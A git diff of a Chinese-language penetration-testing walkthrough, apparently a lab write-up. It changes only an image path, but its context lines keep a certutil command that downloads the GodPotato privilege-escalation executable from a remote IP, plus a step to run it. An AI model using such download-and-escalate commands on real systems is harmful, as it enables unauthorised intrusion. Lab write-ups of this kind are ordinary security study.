@@ -138,7 +138,7 @@ certutil -split -f -urlcache http://192.168.45.158/GodPotato-NET4.exe
 
 * 上传成功后，执行一下GodPotato-NET4.exe程序，看看是否可以成功执行：
 
-<figure><img src="../.gitbook/assets/29 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/29 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
